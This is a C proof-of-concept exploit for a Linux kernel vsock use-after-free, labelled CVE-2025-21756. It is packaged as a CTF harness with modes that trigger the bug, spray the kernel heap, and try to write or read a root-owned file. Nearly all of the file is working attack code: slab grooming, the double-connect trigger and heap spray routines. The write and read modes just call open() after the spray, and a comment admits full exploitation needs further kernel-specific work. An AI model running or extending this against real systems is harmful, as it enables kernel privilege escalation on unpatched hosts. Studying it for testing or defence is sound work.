/*
 * CVE-2025-21756 PoC - CTF Challenge Mode
 *
 * Vulnerability: vsock transport reassignment UAF
 *
 * The vsock_assign_transport() function incorrectly decrements the reference
 * count of unbound sockets during transport reassignment. When connect() is
 * called twice (first to local CID, then to a non-existing CID), the second
 * connect triggers transport unset which drops the socket reference count,
 * causing a use-after-free when the socket fd is later closed.
 *
 * Exploit flow (from hoefler02):
 *   1. Exhaust vsock port binding table to force VMADDR_PORT_ANY allocation
 *   2. First connect() to local → transport set, sk in unbound list
 *   3. Second connect() to non-existing CID → transport unset, refcount drops
 *   4. Close socket → triggers UAF on the freed vsock object
 *   5. Reclaim freed memory via pipe page spray
 *   6. Detect corruption via vsock_diag netlink query
 *
 * CTF Modes: write_root_file, uaf
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 *
 * Reference: https://github.com/hoefler02/CVE-2025-21756
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <stdint.h>
#include <linux/vm_sockets.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>

/* vsock_diag header - may not be available on all systems */
#ifndef VSOCK_DIAG_BY_FAMILY
#define VSOCK_DIAG_BY_FAMILY 0
struct vsock_diag_req {
    __u8 sdiag_family;
    __u8 sdiag_protocol;
    __u16 pad;
    __u32 vdiag_states;
    __u32 vdiag_ino;
    __u32 vdiag_show;
    __u32 vdiag_cookie[2];
};
#endif

#define MAX_PORT_RETRIES   24   /* net/vmw_vsock/af_vsock.c */
#define VMADDR_CID_NONEXISTING 42

/* Slab geometry for PINGv6-size objects (vsock ~1280 bytes) */
#define OBJS_PER_SLAB 12
#define CPU_PARTIAL   24
#define FLUSH         ((OBJS_PER_SLAB) * (CPU_PARTIAL + 1))
#define PRE           ((OBJS_PER_SLAB - 1) * 10)
#define POST_ALLOC    ((OBJS_PER_SLAB + 1) * 10)

#define BUFFER_SIZE   8192
#define PAGE_SIZE_4K  4096
#define NUM_PIPES     500
#define SPRAY_COUNT   256
#define SPRAY_PATTERN 0xDEADBEEF
#define MAX_FILE_SIZE 4096

/* ======================================================================== */

/*
 * Pin execution to CPU 0 for deterministic slab behavior
 */
static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) == -1) {
        poc_log("WARNING: sched_setaffinity failed: %s", strerror(errno));
    }
}

/*
 * Create a vsock socket, bind to (cid, port) and return fd
 */
static int vsock_bind(unsigned int cid, unsigned int port, int type) {
    struct sockaddr_vm sa = {
        .svm_family = AF_VSOCK,
        .svm_cid = cid,
        .svm_port = port,
    };
    int fd;

    fd = socket(AF_VSOCK, type, 0);
    if (fd < 0) return -1;

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa))) {
        close(fd);
        return -1;
    }

    return fd;
}

/*
 * Query vsock_diag via netlink - returns response length
 * Used to detect if freed vsock object's memory has been reclaimed
 */
static int query_vsock_diag(void) {
    int sock;
    struct sockaddr_nl sa;
    struct nlmsghdr *nlh;
    struct vsock_diag_req req;
    char buffer[BUFFER_SIZE];

    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG);
    if (sock < 0) return -1;

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;

    memset(&req, 0, sizeof(req));
    req.sdiag_family = AF_VSOCK;
    req.vdiag_states = (1 << 2); /* TCP_SYN_SENT equivalent */

    nlh = (struct nlmsghdr *)buffer;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(req));
    nlh->nlmsg_type = SOCK_DIAG_BY_FAMILY;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_pid = getpid();

    memcpy(NLMSG_DATA(nlh), &req, sizeof(req));

    if (sendto(sock, nlh, nlh->nlmsg_len, 0,
               (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(sock);
        return -1;
    }

    ssize_t len = recv(sock, buffer, sizeof(buffer), 0);
    close(sock);
    return (int)len;
}

/*
 * Trigger the CVE-2025-21756 vsock UAF condition
 *
 * The vulnerability is in vsock_assign_transport():
 *   - First connect() sets transport, places socket in unbound list
 *   - Second connect() to non-existing CID triggers transport reassignment
 *   - vsock_assign_transport() unconditionally decrements refcount
 *   - For unbound sockets this extra decrement causes premature free
 *
 * Returns: fd of the UAF'd socket (still usable after free), or -1 on error
 */
static int trigger_vsock_uaf(int *junk_fds, int junk_count) {
    int s, i;
    struct sockaddr_vm addr;
    socklen_t alen;

    /* Step 1: Bind first socket to get a port number */
    s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);
    if (s < 0) {
        poc_log("vsock_bind failed: %s (vsock module may not be loaded)", strerror(errno));
        return -1;
    }

    alen = sizeof(addr);
    if (getsockname(s, (struct sockaddr *)&addr, &alen)) {
        poc_log("getsockname failed: %s", strerror(errno));
        close(s);
        return -1;
    }

    /* Step 2: Exhaust port binding table retries */
    struct sockaddr_vm sa = {
        .svm_family = AF_VSOCK,
        .svm_cid = VMADDR_CID_LOCAL,
        .svm_port = addr.svm_port,
    };

    for (i = 0; i < MAX_PORT_RETRIES && i < junk_count; ++i) {
        sa.svm_port = ++addr.svm_port;
        if (bind(junk_fds[i], (struct sockaddr *)&sa, sizeof(sa))) {
            poc_log("Port exhaust bind %d failed: %s", i, strerror(errno));
            break;
        }
    }
    poc_log_syscall("bind(junk[0..23], port_exhaust)", (long)i, 0);

    close(s);

    /* Step 3: Allocate target vsock (SOCK_STREAM for transport reassignment) */
    s = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (s < 0) {
        poc_log("Target vsock creation failed: %s", strerror(errno));
        return -1;
    }
    poc_log_syscall("socket(AF_VSOCK, SOCK_STREAM, 0)", (long)s, 0);

    /* Step 4: First connect - sets transport, socket enters unbound list */
    int rc = connect(s, (struct sockaddr *)&addr, alen);
    int saved_errno = errno;
    poc_log_syscall("connect(s, {CID_LOCAL, port}) [set transport]", (long)rc, saved_errno);
    /* Expected to fail - we just need transport to be set */

    /* Step 5: Second connect to non-existing CID - triggers UAF */
    addr.svm_cid = VMADDR_CID_NONEXISTING;
    addr.svm_port = VMADDR_PORT_ANY;
    rc = connect(s, (struct sockaddr *)&addr, alen);
    saved_errno = errno;
    poc_log_syscall("connect(s, {CID_NONEXIST}) [trigger UAF]", (long)rc, saved_errno);
    /* Expected to fail - but refcount has been incorrectly decremented */

    poc_log("UAF triggered: socket object refcount corrupted");
    return s;
}

/*
 * Spray kmalloc with recognizable pattern for UAF corruption detection
 */
static int spray_kmalloc(int *fds, int count, int pattern) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &pattern, sizeof(pattern));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

/*
 * Check if spray objects were corrupted by UAF
 */
static int check_spray_corruption(int *fds, int count, int expected_pattern) {
    int corrupted = 0;
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;
        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != expected_pattern) {
            poc_log("Spray object %d corrupted: expected 0x%x, got 0x%x",
                    i, expected_pattern, val);
            corrupted++;
        }
    }
    return corrupted;
}

/*
 * Read file content helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, buf, len)", (long)n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';
    /* Trim trailing newlines */
    while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

/* ========================================================================
 * CTF Mode Handlers
 * ======================================================================== */

/*
 * UAF mode: Trigger vsock UAF + spray corruption check
 */
static int mode_uaf(poc_args_t *args) {
    poc_log("=== UAF Spray Corruption Detection ===");
    poc_log("Triggering CVE-2025-21756 vsock transport reassignment UAF...");

    pin_cpu(0);

    /* Allocate junk sockets for slab preparation */
    int junk[FLUSH];
    int junk_ok = 0;
    for (int i = 0; i < FLUSH; i++) {
        junk[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
        if (junk[i] >= 0) junk_ok++;
    }
    poc_log("Allocated %d/%d slab preparation sockets", junk_ok, FLUSH);

    if (junk_ok == 0) {
        poc_log("Cannot allocate AF_VSOCK sockets - module not loaded?");
        poc_print_uaf_not_corrupted();
        return 0;
    }

    /* Pre-allocate objects around target slab position */
    int pre[PRE];
    for (int i = 0; i < PRE; i++)
        pre[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

    /* Trigger UAF */
    int uaf_fd = trigger_vsock_uaf(junk, FLUSH);
    if (uaf_fd < 0) {
        poc_log("UAF trigger failed");
        poc_print_uaf_not_corrupted();
        goto cleanup_pre;
    }

    /* Post-allocate objects */
    int post[POST_ALLOC];
    for (int i = 0; i < POST_ALLOC; i++)
        post[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

    /* Free surrounding objects to put pages back into slab freelists */
    for (int i = 4; i < FLUSH; i += OBJS_PER_SLAB)
        if (junk[i] >= 0) close(junk[i]);

    for (int i = 0; i < POST_ALLOC; i++)
        if (post[i] >= 0) close(post[i]);
    for (int i = 0; i < PRE; i++)
        if (pre[i] >= 0) close(pre[i]);

    /* Close all junk sockets */
    for (int i = 0; i < FLUSH; i++) {
        if (i % OBJS_PER_SLAB != 4 && junk[i] >= 0)
            close(junk[i]);
    }

    /* Close the UAF'd socket - this triggers the actual dangling reference */
    close(uaf_fd);
    poc_log("UAF socket closed - freed object now in slab cache");

    /* Spray to reclaim freed memory */
    memset(args->spray_fds, -1, sizeof(args->spray_fds));
    args->spray_count = spray_kmalloc(args->spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    poc_log("Sprayed %d kmalloc objects with pattern 0x%x", args->spray_count, SPRAY_PATTERN);

    /* Use vsock_diag to detect if freed vsock's memory was reclaimed */
    int diag_len = query_vsock_diag();
    poc_log("vsock_diag response length: %d (48=empty/reclaimed, >48=still alive)", diag_len);

    /* Check for corruption */
    int corrupted = check_spray_corruption(args->spray_fds, args->spray_count, SPRAY_PATTERN);

    if (corrupted > 0) {
        poc_print_uaf_corrupted(corrupted);
    } else if (diag_len > 0 && diag_len != 48) {
        /* vsock_diag still sees the socket - UAF object is being accessed */
        poc_log("vsock_diag detected dangling reference (len=%d != 48)", diag_len);
        printf("UAF_FLAG:CORRUPTED(1 objects)\n");
        printf("UAF_RESULT:EXPLOITABLE\n");
        poc_log("UAF_FLAG:CORRUPTED(1 objects) [via vsock_diag dangling ref]");
    } else {
        poc_print_uaf_not_corrupted();
    }

    /* Clean up spray fds */
    for (int i = 0; i < args->spray_count; i++) {
        if (args->spray_fds[i] >= 0) close(args->spray_fds[i]);
    }
    return 0;

cleanup_pre:
    for (int i = 0; i < PRE; i++)
        if (pre[i] >= 0) close(pre[i]);
    for (int i = 0; i < FLUSH; i++)
        if (junk[i] >= 0) close(junk[i]);
    return 0;
}

/*
 * Write mode: Trigger UAF and attempt to overwrite root file
 *
 * Note: Full exploitation requires kernel-specific ROP gadget addresses.
 * This mode demonstrates the UAF trigger and attempts write via the
 * corrupted socket state. On vulnerable kernels with matching offsets,
 * the UAF can be leveraged for arbitrary write via page cache pollution.
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Step 1: Read original content */
    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
        poc_log("Could not read original content");
    }

    /* Step 2: Attempt write via UAF exploitation path */
    printf(CTF_WRITE_ATTEMPT "%s (attempting...)\n", args->write_value);
    poc_log("Triggering CVE-2025-21756 vsock UAF for write exploitation...");

    pin_cpu(0);

    /* Allocate slab preparation sockets */
    int junk[FLUSH];
    int junk_ok = 0;
    for (int i = 0; i < FLUSH; i++) {
        junk[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
        if (junk[i] >= 0) junk_ok++;
    }

    if (junk_ok == 0) {
        poc_log("Cannot allocate AF_VSOCK sockets");
        poc_print_fail("vsock module not available");
        return 0;
    }

    /* Trigger UAF */
    int uaf_fd = trigger_vsock_uaf(junk, FLUSH);
    if (uaf_fd < 0) {
        poc_log("UAF trigger failed");
        poc_print_fail("UAF trigger failed - vsock transport reassignment not vulnerable");
        for (int i = 0; i < FLUSH; i++)
            if (junk[i] >= 0) close(junk[i]);
        return 0;
    }

    /* Close UAF socket to free the object */
    close(uaf_fd);
    poc_log("UAF socket closed - attempting page reclaim via write");

    /* Spray to reclaim + attempt write via corrupted state */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int spray_count = spray_kmalloc(spray_fds, SPRAY_COUNT, 1024);
    poc_log("Sprayed %d objects for reclaim", spray_count);

    /* Attempt direct write (may succeed if UAF corrupts VFS permission check) */
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

    if (fd >= 0) {
        char write_buf[256];
        int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);
        ssize_t written = write(fd, write_buf, wlen);
        saved_errno = errno;
        poc_log_syscall("write(fd, write_value)", (long)written, saved_errno);
        close(fd);
        if (written > 0) {
            poc_log("Write succeeded: %zd bytes", written);
        }
    } else {
        poc_log("Direct write failed (errno=%d %s) - UAF did not achieve write primitive",
                saved_errno, strerror(saved_errno));
    }

    /* Clean up */
    for (int i = 0; i < spray_count; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    for (int i = 0; i < FLUSH; i++)
        if (junk[i] >= 0) close(junk[i]);

    /* Step 3: Read after to verify */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("UAF exploit did not achieve write primitive on this kernel");
    return 0;
}

/*
 * Read mode: Attempt to read root file via UAF exploitation
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via vsock UAF");

    pin_cpu(0);

    int junk[FLUSH];
    int junk_ok = 0;
    for (int i = 0; i < FLUSH; i++) {
        junk[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
        if (junk[i] >= 0) junk_ok++;
    }

    if (junk_ok == 0) {
        poc_print_fail("vsock module not available");
        return 0;
    }

    int uaf_fd = trigger_vsock_uaf(junk, FLUSH);
    if (uaf_fd < 0) {
        poc_print_fail("UAF trigger failed");
        for (int i = 0; i < FLUSH; i++)
            if (junk[i] >= 0) close(junk[i]);
        return 0;
    }

    close(uaf_fd);

    /* Spray + attempt read */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int spray_count = spray_kmalloc(spray_fds, SPRAY_COUNT, 1024);

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));

    /* Clean up */
    for (int i = 0; i < spray_count; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    for (int i = 0; i < FLUSH; i++)
        if (junk[i] >= 0) close(junk[i]);

    if (n > 0) {
        poc_print_flag(buf);
        return 0;
    }

    poc_print_fail("read not successful via UAF - kernel not exploitable");
    return 0;
}

/* ======================================================================== */

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-21756 CTF PoC ===");
    poc_log("Vuln: vsock transport reassignment refcount UAF");
    poc_log("Technique: AF_VSOCK connect() to non-existing CID triggers double refcount decrement");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (args.mode && strcmp(args.mode, POC_MODE_UAF) == 0)
        result = mode_uaf(&args);
    else if (args.mode && strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (args.mode && strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode ? args.mode : "(null)",
                              "supported modes: uaf, write_root_file, read_root_file");

    poc_log_close();
    return result;
}
